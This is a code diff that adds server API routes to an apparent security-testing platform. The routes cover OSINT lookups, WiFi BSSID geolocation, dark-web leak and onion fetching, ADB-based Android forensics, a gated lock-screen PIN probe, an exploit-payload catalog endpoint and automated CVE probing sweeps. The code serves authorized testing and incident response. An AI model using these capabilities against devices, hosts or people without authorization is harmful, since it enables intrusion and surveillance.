+  const result = await ipInfraScan(t.value);
+  for (const cve of (result.shodan.data?.vulns ?? []).slice(0, 25)) {
+    upsertMissionFindingToLedger({
+      title: `Known CVE matched on ${result.ip} — ${cve}`,
+      description: `Shodan InternetDB matched ${cve} against a CPE observed on ${result.ip}. This is a database match on an observed product version, NOT proof the host is exploitable — verify before acting.`,
+      severity: 'medium',
+      targetId: result.ip,
+      operatorId: 'osint-panel',
+      evidence: [{ type: 'log', content: `Shodan InternetDB → ${cve}`, timestamp: Date.now(), metadata: { tool: 'osint_ip_infra' } }],
+    });
+  }
+  if (result.blocklist.data?.listed) {
+    upsertMissionFindingToLedger({
+      title: `IP has abuse history — ${result.ip}`,
+      description: `blocklist.de reports ${result.blocklist.data.attacks} attack(s) and ${result.blocklist.data.reports} report(s).`,
+      severity: 'medium',
+      targetId: result.ip,
+      operatorId: 'osint-panel',
+      evidence: [{ type: 'log', content: `blocklist.de → ${result.blocklist.data.attacks} attacks / ${result.blocklist.data.reports} reports`, timestamp: Date.now(), metadata: { tool: 'osint_ip_infra' } }],
+    });
+  }
+  res.json({ success: true, result });
+});
+
+app.post('/api/osint/infra/hash', async (req: Request, res: Response): Promise<void> => {
+  const r = await circlHash(String(req.body?.hash ?? ''));
+  if (!r.ok) { res.status(400).json({ error: r.note ?? 'hash lookup failed' }); return; }
+  if (r.data) {
+    upsertMissionFindingToLedger({
+      title: `Known File Identified — ${r.data.fileName ?? String(req.body?.hash)}`,
+      description: `CIRCL hashlookup matched ${r.data.hash} to "${r.data.fileName}"${r.data.mimeType ? ` (${r.data.mimeType})` : ''}${r.data.os ? `, shipped as part of ${r.data.os}` : ''}. This identifies the file only — it is not a malware verdict.`,
+      severity: 'info',
+      operatorId: 'osint-panel',
+      evidence: [{ type: 'log', content: `CIRCL hashlookup → ${r.data.fileName}`, timestamp: Date.now(), metadata: { tool: 'osint_hash_lookup' } }],
+    });
+  }
+  res.json({ success: true, found: Boolean(r.data), note: r.note, result: r.data });
+});
+
+// -----------------------------------------------------------------------------
+// Google OSINT — app linkage (Digital Asset Links) + WiFi geolocation.
+//
+// Keyless and read-only. The DAL statements come from Google's own public index;
+// the ONLY request that touches the subject's origin is the iOS association file,
+// and that one is opt-in via `includeIos` because the UI states it on the control.
+// -----------------------------------------------------------------------------
+
+app.post('/api/osint/google/app-linkage', async (req: Request, res: Response): Promise<void> => {
+  const domain = String(req.body?.domain ?? '');
+  const includeIos = req.body?.includeIos === true;
+  try {
+    console.log(`[T3MP3ST][OSINT] google app linkage: ${domain}${includeIos ? ' (+iOS well-known)' : ''}`);
+    const result = await googleAppLinkage(domain, { includeIos });
+    for (const app of result.apps) {
+      upsertMissionFindingToLedger({
+        title: `Android app vouches for ${result.website} — ${app.packageName}`,
+        description: `${result.website} publishes a Digital Asset Links statement naming ${app.packageName}${app.firstParty ? ' with the handle_all_urls relation, i.e. it may act as the site everywhere' : ''}. This is the domain publisher's own claim — it is not an endorsement by Google and says nothing about whether the app is safe.`,
+        severity: 'info',
+        targetId: result.website,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `DAL → ${app.packageName}${app.certFingerprint ? ` [cert ${app.certFingerprint.slice(0, 17)}…]` : ''}`, timestamp: Date.now(), metadata: { tool: 'osint_google_app_linkage' } }],
+      });
+    }
+    // The association pivots are the genuinely novel output: domains that trust
+    // this one for login. Recorded individually, bounded so one huge domain
+    // cannot flood the ledger.
+    for (const site of result.associatedSites.slice(0, 15)) {
+      upsertMissionFindingToLedger({
+        title: `Associated domain — ${site.site}`,
+        description: `${result.website} delegates to ${site.site} via a Digital Asset Links statement. Associated domains routinely expose SSO/auth infrastructure that a subdomain scan misses.`,
+        severity: 'low',
+        targetId: site.site,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `DAL association → ${site.site}`, timestamp: Date.now(), metadata: { tool: 'osint_google_app_linkage' } }],
+      });
+    }
+    res.json({ success: true, source: GOOGLE_OSINT_SOURCE, version: GOOGLE_OSINT_VERSION, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/google/wifi-locate', async (req: Request, res: Response): Promise<void> => {
+  const bssids = String(req.body?.bssids ?? '');
+  if (!bssids.trim()) { res.status(400).json({ error: 'bssids required (one or more WiFi access point MAC addresses)' }); return; }
+  // A missing key is refused BEFORE any request to Google. Called unkeyed, that
+  // endpoint answers 403 "unregistered callers", which an operator would
+  // reasonably misread as "Google has no location for this network".
+  if (!googleGeoKeyConfigured()) {
+    res.status(400).json({
+      error: 'WiFi geolocation is not configured — set T3MP3ST_GOOGLE_GEO_KEY. Google refuses this endpoint for unregistered callers, so no query was sent.',
+      configured: false,
+    });
+    return;
+  }
+  try {
+    console.log(`[T3MP3ST][OSINT] wifi geolocation: ${bssids.replace(/[^0-9a-f:\s,;-]/gi, '')}`);
+    const result = await googleWifiLocate(bssids);
+    if (!result.ok) { res.status(400).json({ error: result.note ?? 'WiFi geolocation failed', ...result }); return; }
+    upsertMissionFindingToLedger({
+      title: `WiFi geolocation — ${result.observations} BSSID(s)`,
+      description: `Position ${result.lat}, ${result.lng} with a ${result.accuracyMeters ?? '?'} m accuracy radius, derived from ${result.observations} observed access point(s). An estimated coverage area derived from where those APs have been seen — NOT a live device fix, and the network may have moved.`,
+      severity: 'info',
+      operatorId: 'osint-panel',
+      evidence: [{ type: 'log', content: `geolocate → ${result.lat}, ${result.lng} (±${result.accuracyMeters ?? '?'}m)`, timestamp: Date.now(), metadata: { tool: 'osint_google_bssid_locate' } }],
+    });
+    res.json({ success: true, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+/** Lets the panel show the operator the real state of the lane instead of a
+ *  button that silently does nothing. */
+app.get('/api/osint/google/status', async (_req: Request, res: Response): Promise<void> => {
+  res.json({
+    success: true,
+    source: GOOGLE_OSINT_SOURCE,
+    version: GOOGLE_OSINT_VERSION,
+    appLinkage: { configured: true, needsKey: false },
+    wifiLocate: { configured: googleGeoKeyConfigured(), envVar: 'T3MP3ST_GOOGLE_GEO_KEY' },
+  });
+});
+app.get('/api/osint/tor-status', async (_req: Request, res: Response): Promise<void> => {
+  res.json({ success: true, tor: await torStatus() });
+});
+
+app.post('/api/osint/darkweb/leak-check', async (req: Request, res: Response): Promise<void> => {
+  const keyword = typeof req.body?.keyword === 'string' ? req.body.keyword : '';
+  if (!keyword) { res.status(400).json({ error: 'keyword required (target domain or company name)' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] leak-site monitor: ${keyword}`);
+    const result = await ransomwareLeakSearch(keyword);
+    for (const v of result.victims.slice(0, 10)) {
+      upsertMissionFindingToLedger({
+        title: `Leak-Site Victim Post — ${v.victim} (${v.group})`,
+        description: `${v.victim}${v.domain ? ` (${v.domain})` : ''} listed by ransomware group ${v.group}${v.attackDate ? `, attacked ${v.attackDate.slice(0, 10)}` : ''}${v.description ? ` — ${v.description}` : ''}${v.postUrl ? ` Post: ${v.postUrl}` : ''}`,
+        severity: 'medium',
+        targetId: v.domain || keyword,
+        operatorId: 'osint-panel',
+        evidence: [{ type: 'log', content: `ransomware.live ${result.searched}: ${v.group} → ${v.postUrl || 'no post URL'}`, timestamp: Date.now(), metadata: { tool: 'osint_darkweb_leak_monitor' } }],
+      });
+    }
+    res.json({ success: true, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/onion/search', async (req: Request, res: Response): Promise<void> => {
+  const query = typeof req.body?.query === 'string' ? req.body.query : '';
+  if (!query) { res.status(400).json({ error: 'query required' }); return; }
+  try {
+    console.log(`[T3MP3ST][OSINT] onion search: ${query}`);
+    res.json({ success: true, result: await ahmiaSearch(query) });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/osint/onion/fetch', async (req: Request, res: Response): Promise<void> => {
+  const url = typeof req.body?.url === 'string' ? req.body.url : '';
+  if (!url) { res.status(400).json({ error: 'url required (.onion)' }); return; }
+  if (!/^https?:\/\/[a-z2-7]{16,56}\.onion(\/|$)/i.test(url.trim())) {
+    res.status(400).json({ error: 'only .onion hidden-service URLs are fetchable through this lane' });
+    return;
+  }
+  try {
+    console.log(`[T3MP3ST][OSINT] onion fetch: ${url.slice(0, 60)}`);
+    const page = await onionFetch(url);
+    res.json({ success: true, page: { ...page, body: page.body.slice(0, 20_000) } });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+// =============================================================================
+// ANDROID FORENSICS — ADB workflows vendored from DouglasFreshHabian/AndroidForensics
+// Physical device + USB debugging + owner/operator authorization only. All
+// adb shell calls are allowlisted (getprop/pm/dumpsys/settings/content/svc/
+// logcat/bugreport/uptime/ifconfig/ip/netstat) and executed via execFile —
+// no shell injection surface. Every result is audit-logged.
+// =============================================================================
+
+app.get('/api/android/status', async (_req: Request, res: Response): Promise<void> => {
+  try {
+    const status = await getAdbStatus();
+    res.json({ success: true, status, source: ANDROID_FORENSICS_SOURCE, version: ANDROID_FORENSICS_VERSION });
+  } catch (err: any) {
+    res.status(500).json({ error: err?.message || String(err) });
+  }
+});
+
+app.get('/api/android/scripts', (_req: Request, res: Response): void => {
+  res.json({
+    success: true,
+    source: ANDROID_FORENSICS_SOURCE,
+    version: ANDROID_FORENSICS_VERSION,
+    vendorDir: ANDROID_FORENSICS_VENDOR_DIR,
+    scripts: ANDROID_SCRIPTS,
+    dumpsysServices: DUMPSYS_SERVICES,
+  });
+});
+
+app.get('/api/osint/android/status', async (_req: Request, res: Response): Promise<void> => {
+  try {
+    const status = await getAdbStatus();
+    res.json({ success: true, status, source: ANDROID_FORENSICS_SOURCE, version: ANDROID_FORENSICS_VERSION });
+  } catch (err: any) {
+    res.status(500).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/android/adb', async (req: Request, res: Response): Promise<void> => {
+  const command = typeof req.body?.command === 'string' ? req.body.command : '';
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  const timeoutMs = Number.isFinite(req.body?.timeoutMs) ? Math.max(2000, Math.min(120_000, Number(req.body.timeoutMs))) : undefined;
+  if (!command) { res.status(400).json({ error: 'command required (must start with "adb ")', example: 'adb devices' }); return; }
+  try {
+    console.log(`[T3MP3ST][ANDROID] adb exec: ${command.slice(0, 120)}`);
+    const result = await execAdbCommand(command, { serial, timeoutMs });
+    res.json({ success: result.exitCode === 0, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/android/device-info', async (req: Request, res: Response): Promise<void> => {
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  try {
+    const result = await getDeviceInfo(serial);
+    res.json({ success: result.exitCode === 0, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/android/packages', async (req: Request, res: Response): Promise<void> => {
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  const thirdPartyOnly = req.body?.thirdPartyOnly === true;
+  try {
+    const result = await getPackages(serial, thirdPartyOnly);
+    const packages = parsePackageList(result.stdout);
+    res.json({ success: result.exitCode === 0, result, packages, count: packages.length });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/android/dumpsys', async (req: Request, res: Response): Promise<void> => {
+  const service = typeof req.body?.service === 'string' ? req.body.service : '';
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  if (!service) { res.status(400).json({ error: 'service required', available: DUMPSYS_SERVICES.map((s) => s.service) }); return; }
+  try {
+    const result = await dumpsysService(service, serial);
+    res.json({ success: result.exitCode === 0, result });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err), available: DUMPSYS_SERVICES.map((s) => s.service) });
+  }
+});
+
+app.post('/api/android/wifi-scan', async (req: Request, res: Response): Promise<void> => {
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  try {
+    const result = await wifiScan(serial);
+    if (result.exitCode !== 0) { res.json({ success: false, result, error: result.stderr.slice(0, 800) }); return; }
+    const networks = parseWifiScan(result.stdout);
+    res.json({ success: true, result, networks, count: networks.length });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.post('/api/android/secret-codes', async (req: Request, res: Response): Promise<void> => {
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  const limit = Number.isFinite(req.body?.limit) ? Math.max(5, Math.min(100, Number(req.body.limit))) : 30;
+  try {
+    const list = await execAdbCommand('adb shell pm list packages -s -f', { serial });
+    if (list.exitCode !== 0) { res.json({ success: false, error: list.stderr.slice(0, 800), result: list }); return; }
+    const pkgs = list.stdout.split('\n').map((l) => l.trim()).filter((l) => l.includes('package:'))
+      .map((l) => l.split('package:')[1]?.split('=')[1]?.trim()).filter(Boolean) as string[];
+    const batch = pkgs.slice(0, limit);
+    const hits: Array<{ pkg: string; line: string }> = [];
+    for (const pkg of batch) {
+      try {
+        const dump = await execAdbCommand(`adb shell pm dump ${pkg}`, { serial });
+        for (const line of parseSecretCodes(dump.stdout)) hits.push({ pkg, line });
+      } catch { /* per-package best-effort */ }
+    }
+    res.json({ success: true, scanned: batch.length, totalSystemPackages: pkgs.length, hits, truncated: pkgs.length > limit });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+// Lock-screen PIN probe — the one device capability here that touches the lock
+// screen. Gated on an explicit operator authorization acknowledgement, capped at
+// ONE attempt per call (no PIN enumeration, no brute force), and only reachable
+// once the device owner has already granted this host ADB authorization.
+// Technique from DouglasFreshHabian/UnlockAndroid — reimplemented natively
+// (upstream declares no license, so nothing is vendored).
+app.post('/api/android/lock-probe', async (req: Request, res: Response): Promise<void> => {
+  const pin = typeof req.body?.pin === 'string' ? req.body.pin : '';
+  const serial = typeof req.body?.serial === 'string' ? req.body.serial : undefined;
+  if (req.body?.confirmAuthorized !== true) {
+    res.status(403).json({
+      error: 'Authorization acknowledgement required — confirm you own or are authorized to test this device. Unlocking a handset you have no right to is a criminal offence in most jurisdictions.',
+      upstream: ANDROID_UNLOCK_SOURCE,
+    });
+    return;
+  }
+  try {
+    const result = await probeLockPin({ pin, serial, confirmAuthorized: true });
+    console.log(`[T3MP3ST][ANDROID] lock probe: ${result.verdict}`);
+    if (result.ok && !result.alreadyUnlocked) {
+      upsertMissionFindingToLedger({
+        title: 'Android Lock-Screen PIN Probe (authorized device)',
+        description: `${result.verdict} Before: ${result.before.detail}. After: ${result.after.detail}. Attempts: ${result.attempts}/${MAX_PIN_ATTEMPTS}. Technique: ${result.upstream}`,
+        severity: 'info',
+        operatorId: 'android-panel',
+        evidence: [{ type: 'adb-command-trace', content: result.steps.map((s) => s.command).join(' | ').slice(0, 2000), metadata: { tool: 'android_adb_lock_probe' } }],
+      });
+    }
+    res.json({ success: result.ok, ...result, maxAttempts: MAX_PIN_ATTEMPTS, version: ANDROID_UNLOCK_VERSION });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+app.get('/api/android/lock-state', async (req: Request, res: Response): Promise<void> => {
+  const serial = typeof req.query.serial === 'string' ? req.query.serial : undefined;
+  try {
+    res.json({ success: true, state: await getLockState(serial), upstream: ANDROID_UNLOCK_SOURCE });
+  } catch (err: any) {
+    res.status(400).json({ error: err?.message || String(err) });
+  }
+});
+
+// =============================================================================
+// CVE THREAT INTELLIGENCE VAULT & CISA KEV FEEDS
+// =============================================================================
+
+app.get('/api/cves/feed', (req: Request, res: Response) => {
+  const search = typeof req.query.search === 'string' ? req.query.search : undefined;
+  const filter = typeof req.query.filter === 'string' ? (req.query.filter as any) : 'all';
+  const vendor = typeof req.query.vendor === 'string' ? req.query.vendor : undefined;
+  const limit = req.query.limit ? parseInt(String(req.query.limit), 10) : 50;
+  const offset = req.query.offset ? parseInt(String(req.query.offset), 10) : 0;
+
+  const result = CveFeedEngine.query({ search, filter, vendor, limit, offset });
+  const summary = CveFeedEngine.loadFeed();
+
+  res.json({
+    success: true,
+    totalCount: summary.totalCount,
+    ransomwareCount: summary.ransomwareCount,
+    highEpssCount: summary.highEpssCount,
+    probesAvailableCount: summary.probesAvailableCount,
+    lastSyncedAt: summary.lastSyncedAt,
+    filteredCount: result.total,
+    offset,
+    limit,
+    items: result.items
+  });
+});
+
+app.post('/api/cves/sync', async (_req: Request, res: Response): Promise<void> => {
+  try {
+    const result = await CveFeedEngine.syncLiveFeed({ timeoutMs: 15000 });
+    emitContractEvent('cve_feed.synced', { count: result.count, timestamp: new Date().toISOString() });
+    res.json({ success: true, ...result });
+  } catch (err: any) {
+    res.status(500).json({ error: 'CVE feed sync failed: ' + (err?.message || err) });
+  }
+});
+
+// ── Operator settings persistence ───────────────────────────────────────────
+// The UI settings blob (LLM keys, local model, proxy, toggles) previously lived ONLY in each
+// browser's localStorage. It now persists to the settings DB (state root JSON file, survives
+// restarts) and every change lands in the Supabase event audit. GET returns the full saved
+// blob — the server binds 127.0.0.1 only, so this is same-trust as the .env on disk.
+app.get('/api/settings', (_req: Request, res: Response): void => {
+  res.json({ success: true, settings: dbSettings.settings || {}, updatedAt: dbSettings.updatedAt || null });
+});
+
+app.post('/api/settings', (req: Request, res: Response): void => {
+  const body = req.body as Record<string, unknown>;
+  if (!body || typeof body.settings !== 'object' || body.settings === null || Array.isArray(body.settings)) {
+    res.status(400).json({ error: 'settings object required' });
+    return;
+  }
+  const saved = mergeDbSettings(body.settings);
+  saveDbSettings(typeof body.reason === 'string' ? body.reason : 'settings.updated');
+  res.json({ success: true, updatedAt: saved.updatedAt, keys: Object.keys(saved.settings || {}).length });
+});
+
+// KEV payload catalog — exploit payloads for the CVEs the map/vault lists.
+// MUST be registered before /api/cves/:cveId or "payloads" is eaten as :cveId.
+app.get('/api/cves/payloads', (req: Request, res: Response): void => {
+  const single = typeof req.query.cveId === 'string' ? req.query.cveId.trim() : '';
+  if (single) {
+    const entry = getPayloadsForCve(single);
+    if (!entry) {
+      res.status(404).json({ success: false, error: `No payload catalog entry for ${single}`, catalogSize: CVE_PAYLOAD_CATALOG.length });
+      return;
+    }
+    res.json({ success: true, entry });
+    return;
+  }
+  res.json({
+    success: true,
+    count: CVE_PAYLOAD_CATALOG.length,
+    authorizedUse: 'Lab and receipted targets only — see T3MP3ST SCOPE_AND_AUTHORIZATION. Canary/inert variants are included where out-of-band proof suffices.',
+    catalog: CVE_PAYLOAD_CATALOG,
+  });
+});
+
+app.get('/api/cves/:cveId', (req: Request, res: Response): void => {
+  const record = CveFeedEngine.getSingleCve(req.params.cveId || '');
+  if (!record) {
+    res.status(404).json({ success: false, error: `CVE not found in local feed: ${req.params.cveId}` });
+    return;
+  }
+  const summary = CveFeedEngine.loadFeed();
+  res.json({
+    success: true,
+    feedTotalCount: summary.totalCount,
+    lastSyncedAt: summary.lastSyncedAt,
+    cve: record
+  });
+});
+
+app.get('/api/cves/:cveId/epss', async (req: Request, res: Response): Promise<void> => {
+  const cveId = req.params.cveId;
+  if (!cveId) {
+    res.status(400).json({ error: 'cveId required' });
+    return;
+  }
+  const epss = await CveFeedEngine.fetchLiveEpss(cveId);
+  res.json({ success: true, ...epss });
+});
+
+// CVE correlation — THIN ADAPTER over the validated boundary handler.
+// handleCorrelationApi owns request validation AND correlation in one place, so
+// malformed input can never reach the matcher, and the route itself performs no
+// I/O: the caller supplies the KEV/EPSS feed payload (with provenance) and this
+// layer only translates the validated result into HTTP. Anything that reaches
+// for a live feed belongs in a tool, not in the request path.
+app.post('/api/recon/correlate-cves', (req: Request, res: Response): void => {
+  const result = handleCorrelationApi(req.body);
+  res.status(result.status).json(result.body);
+});
+
+// The live-feed correlator: it fetches CISA KEV + FIRST EPSS itself and can
+// auto-probe suggested CVEs, so it is deliberately NOT the request-path handler
+// above. Kept as its own route for operators who want the live behaviour.
+app.post('/api/recon/correlate-cves/live', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body as Record<string, unknown>;
+  const target = typeof body.target === 'string' && body.target.trim() ? body.target.trim() : 'target';
+  const technologies = Array.isArray(body.technologies) ? body.technologies.map(String) : undefined;
+  const banner = typeof body.banner === 'string' ? body.banner : undefined;
+  const headers = typeof body.headers === 'object' && body.headers !== null ? (body.headers as Record<string, string>) : undefined;
+  const autoProbe = Boolean(body.autoProbe);
+
+  try {
+    const result = CveCorrelator.correlate({ target, technologies, banner, headers });
+
+    // Broadcast intel alert if ransomware-linked or critical KEVs detected
+    if (result.matchedCount > 0) {
+      emitContractEvent('intel.kev_match', {
+        target,
+        matchedCount: result.matchedCount,
+        ransomwareCount: result.ransomwareCount,
+        highestEpss: result.highestEpss,
+        timestamp: result.timestamp
+      });
+    }
+
+    let probeResults = undefined;
+    if (autoProbe && result.suggestedProbeIds.length > 0) {
+      probeResults = await CveCorrelator.executeSuggestedProbes(target, result.suggestedProbeIds);
+    }
+
+    res.json({
+      success: true,
+      ...result,
+      probeResults
+    });
+  } catch (err: any) {
+    res.status(500).json({ error: 'CVE correlation failed: ' + (err?.message || err) });
+  }
+});
+
+// =============================================================================
+// RAPID RESPONSE & TARGETED CVE SWEEPS (Horizon3.ai NodeZero inspired)
+// =============================================================================
+
+app.get('/api/tools/rapid-response/catalog', (_req: Request, res: Response) => {
+  res.json({
+    success: true,
+    totalChecks: RAPID_RESPONSE_CATALOG.length,
+    catalog: RapidResponseEngine.getCatalog()
+  });
+});
+
+app.post('/api/tools/rapid-response/sweep', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body as Record<string, unknown>;
+  const targets = Array.isArray(body.targets) ? body.targets.map(String).filter(Boolean) : (typeof body.target === 'string' && body.target.trim() ? [body.target.trim()] : []);
+  const checkIds = Array.isArray(body.checkIds) ? body.checkIds.map(String) : undefined;
+  const timeoutMs = typeof body.timeoutMs === 'number' ? body.timeoutMs : 8000;
+
+  if (targets.length === 0) {
+    res.status(400).json({ error: 'At least one target URL/host is required for Rapid Response sweep.' });
+    return;
+  }
+
+  try {
+    const sweepResult = await RapidResponseEngine.sweep({ targets, checkIds, timeoutMs });
+    
+    for (const vuln of sweepResult.results.filter(r => r.vulnerable)) {
+      emitContractEvent('rapid_response.vulnerable', { ...vuln });
+      WebhookDispatcher.broadcast({
+        event: 'rapid_response_alert',
+        title: `Rapid Response Vulnerability: ${vuln.checkId} on ${vuln.target}`,
+        severity: vuln.severity,
+        target: vuln.target,
+        details: vuln.details,
+        proof: vuln.proof,
+        timestamp: vuln.timestamp
+      }).catch(() => {});
+    }
+
+    res.json({ success: true, ...sweepResult });
+  } catch (err: any) {
+    res.status(500).json({ error: 'Rapid response sweep failed: ' + (err?.message || err) });
+  }
+});
+
+app.post('/api/tools/rapid-response/check', async (req: Request, res: Response): Promise<void> => {
+  const body = req.body as Record<string, unknown>;
+  const checkId = typeof body.checkId === 'string' ? body.checkId : '';
+  const target = typeof body.target === 'string' ? body.target.trim() : '';
+  const timeoutMs = typeof body.timeoutMs === 'number' ? body.timeoutMs : 8000;
+
+  if (!checkId || !target) {
+    res.status(400).json({ error: 'checkId and target required' });
+    return;
+  }
+
+  try {
+    const result = await RapidResponseEngine.runCheck(checkId, target, timeoutMs);
+    if (result.vulnerable) {
+      emitContractEvent('rapid_response.vulnerable', { ...result });
+    }
+    res.json({ success: true, result });
+  } catch (err: any) {
+    res.status(500).json({ error: 'Rapid response check failed: ' + (err?.message || err) });
+  }
+});
+
+// =============================================================================
+// TRIPWIRES & CYBER DECEPTION (Horizon3.ai NodeZero inspired)
+// =============================================================================
+
+app.get('/api/tripwires', (_req: Request, res: Response) => {
+  res.json({
+    success: true,
+    tripwires: TripwireManager.listTripwires()
+  });
+});
+
+app.post('/api/tripwires/generate', (req: Request, res: Response) => {
+  const body = req.body as Record<string, unknown>;
+  const name = typeof body.name === 'string' && body.name.trim() ? body.name.trim() : 'Canary Tripwire';
+  const type = (['aws_key', 'webhook_beacon', 'db_credential', 'bearer_token', 'ad_service_account'].includes(String(body.type))
+    ? body.type : 'webhook_beacon') as any;
+  const description = typeof body.description === 'string' ? body.description : undefined;
+  const targetEnvironment = typeof body.targetEnvironment === 'string' ? body.targetEnvironment : undefined;
+  const hostHeader = req.get('host') || 'localhost:3333';
+  const protocol = req.protocol || 'http';
+  const baseUrl = `${protocol}://${hostHeader}`;
+
+  const tripwire = TripwireManager.generateTripwire({
+    name,
+    type,
+    description,
+    targetEnvironment,
+    baseUrl
+  });
+
+  emitContractEvent('tripwire.created', { tripwireId: tripwire.id, name: tripwire.name, type: tripwire.type });
+  res.status(201).json({ success: true, tripwire });
+});
+
+app.delete('/api/tripwires/:id', (req: Request, res: Response) => {
+  const deleted = TripwireManager.deleteTripwire(req.params.id);
+  res.json({ success: deleted });
+});
+
+app.all(['/api/tripwires/beacon/:token', '/beacon/:token'], (req: Request, res: Response) => {
+  const token = req.params.token;
+  const clientIp = (req.headers['x-forwarded-for'] as string) || req.socket.remoteAddress || req.ip || 'unknown';
+  const userAgent = req.get('user-agent') || 'unknown';
+  const method = req.method;
+  const path = req.originalUrl || req.url;
+
+  const event = TripwireManager.trigger(token, {
+    ip: clientIp,
+    userAgent,
+    method,
+    path,
+    query: req.query as Record<string, any>,
+    headers: req.headers as Record<string, string>,
+    body: req.body
+  });
+
+  if (!event) {
+    res.status(404).send('Not Found');
+    return;
+  }
+
+  const transparentGif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
+  if (req.accepts('image/gif') || req.path.endsWith('.gif') || req.path.endsWith('.png') || req.method === 'GET') {
+    res.set('Content-Type', 'image/gif');
+    res.set('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
+    res.send(transparentGif);
+  } else {
+    res.json({ status: 'ok', recorded: true, id: event.id });
+  }
+});
+
+// =============================================================================
+// DFIR (DIGITAL FORENSICS & INCIDENT RESPONSE) — POST-ATTACK RESOLUTION ENGINE
+// =============================================================================
+
+app.get('/api/dfir/metrics', (_req: Request, res: Response) => {
+  try {
+    const metrics = DFIRManager.getMetrics();
+    res.json(metrics);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to fetch DFIR metrics' });
+  }
+});
+
+app.get('/api/dfir/incidents', (req: Request, res: Response) => {
+  try {
+    const status = typeof req.query.status === 'string' ? req.query.status : undefined;
+    const severity = typeof req.query.severity === 'string' ? req.query.severity : undefined;
+    const search = typeof req.query.q === 'string' ? req.query.q : undefined;
+
+    const incidents = DFIRManager.listIncidents({ status, severity, search });
+    const metrics = DFIRManager.getMetrics();
+    res.json({ incidents, metrics });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to list DFIR incidents' });
+  }
+});
+
+app.get('/api/dfir/incidents/:id', (req: Request, res: Response): void => {
+  try {
+    const incident = DFIRManager.getIncident(req.params.id);
+    if (!incident) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json(incident);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to fetch DFIR incident' });
+  }
+});
+
+app.post('/api/dfir/incidents', (req: Request, res: Response) => {
+  try {
+    const created = DFIRManager.createIncident(req.body || {});
+    res.status(201).json(created);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to create DFIR incident' });
+  }
+});
+
+app.put('/api/dfir/incidents/:id', (req: Request, res: Response): void => {
+  try {
+    const updated = DFIRManager.updateIncident(req.params.id, req.body || {});
+    if (!updated) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json(updated);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to update DFIR incident' });
+  }
+});
+
+app.delete('/api/dfir/incidents/:id', (req: Request, res: Response): void => {
+  try {
+    const ok = DFIRManager.deleteIncident(req.params.id);
+    if (!ok) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json({ deleted: true, id: req.params.id });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to delete DFIR incident' });
+  }
+});
+
+app.post('/api/dfir/incidents/:id/contain', (req: Request, res: Response): void => {
+  try {
+    const isolate = req.body?.isolate !== false;
+    const blockFirewall = req.body?.blockFirewall !== false;
+    const killProcs = !!req.body?.killProcs;
+
+    const incident = DFIRManager.setContainment(req.params.id, isolate, { blockFirewall, killProcs });
+    if (!incident) {
+      res.status(404).json({ error: `Incident ${req.params.id} not found` });
+      return;
+    }
+    res.json({ success: true, incident });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Containment action failed' });
+  }
+});
+
+app.post('/api/dfir/incidents/:id/playbook', async (req: Request, res: Response): Promise<void> => {
+  try {
+    const playbookType = req.body?.playbookType as PlaybookType;
+    if (!playbookType) {
+      res.status(400).json({ error: 'Missing playbookType parameter' });
+      return;
+    }
+
+    const result = await DFIRManager.runPlaybook(req.params.id, playbookType, {
+      targetHost: req.body?.targetHost,
+      customScript: req.body?.customScript
+    });
+
+    res.json(result);
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Playbook execution failed' });
+  }
+});
+
+app.post('/api/dfir/ioc-extract', (req: Request, res: Response): void => {
+  try {
+    const rawText = typeof req.body?.rawText === 'string' ? req.body.rawText : '';
+    if (!rawText.trim()) {
+      res.json({ iocs: [] });
+      return;
+    }
+
+    const extracted = DFIRManager.extractIOCs(rawText);
+    res.json({ iocs: extracted, count: extracted.length });
+  } catch (err: any) {
+    res.status(500).json({ error: err.message || 'Failed to extract IOCs' });
+  }
+});
+
+app.post('/api/dfir/incidents/:id/ioc', (req: Request, res: Response): void => {
